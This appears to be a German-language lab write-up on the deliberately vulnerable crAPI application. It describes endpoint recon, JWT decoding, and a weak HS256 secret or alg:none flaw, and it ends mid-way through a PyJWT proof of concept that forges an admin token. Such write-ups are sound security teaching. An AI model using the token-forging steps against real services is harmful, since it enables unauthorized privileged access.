# crAPI Writeup

**Kurzfassung (TL;DR)**  
Vulnerable API mit unsicherer JWT-Implementierung. Authentifizierte Endpunkte lassen sich durch Erstellen eines manipulierten JWT mit dem bekannten/shared Secret umgehen. Ergebnis: Zugriff auf privilegierte Endpunkte und sensitive Daten.

---

## Kontext / Ziel
- Ziel der Aufgabe: Zugriff auf administrative Ressourcen / Flag erlangen.
- Scope: single API (`crAPI`) auf Zielhost. Keine Tests außerhalb des autorisierten Targets.

---

## Testumgebung
- OS: Kali Linux / Ubuntu
- Tools: `curl`, `httpx`, `jq`, `python3` (PyJWT), `burpsuite` (optional)
- Zielbeispiel: `http://10.10.10.100:8080` (ersetzen durch tatsächliches Ziel)

---

## Vorgehen / Recon
1. **Endpoints entdecken**
   - Verzeichnisscan / API-Discovery (Beispiel):
     ```bash
     httpx -silent -path /api /auth /admin /users -u http://10.10.10.100:8080
     ```
2. **Untersuchen der Auth-Flow**
   - POST `/auth/login` mit Testuser → Antwort enthält `token` (JWT).
   - GET `/me` oder `/users/me` zeigt Claims im Token.

3. **Token analysieren**
   - Token dekodieren (kein secret nötig für Header/Payload):
     ```bash
     echo "<TOKEN>" | cut -d'.' -f2 | base64 -d | jq
     ```
   - Wichtige Felder prüfen: `alg`, `kid`, `role`, `exp`, `iss`, `sub`.

Beobachtung: `alg` = `HS256`. Token-Claim enthält `role: "user"`.

---

## Verwundbarkeit
- JWT verwendet symmetrischen Algorithmus HS256.
- Secret wurde leicht erratbar / geloggt / in Repo gefunden oder der Server akzeptiert `alg: none` (bei manchen Implementierungen).
- Angreifbarkeit: Forged JWT mit `role: "admin"` signiert mit bekanntem/erratbarem Secret oder durch Wahl von `alg: none` wenn Server dies akzeptiert.

(Bei anderen Schwachstellen wie IDOR, SQLi oder RCE passen die Schritte entsprechend an.)

---

## Exploitation — Proof of Concept

### 1) Token erzeugen (wenn Secret `secret` bekannt/erratbar)
Beispiel mit Python / PyJWT:
```python
# poc_forge_jwt.py
import jwt
payload = {"sub":"attacker","role":"admin"}
secret = "secret"  # nur als Beispiel; ersetze durch gefundenes Secret
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
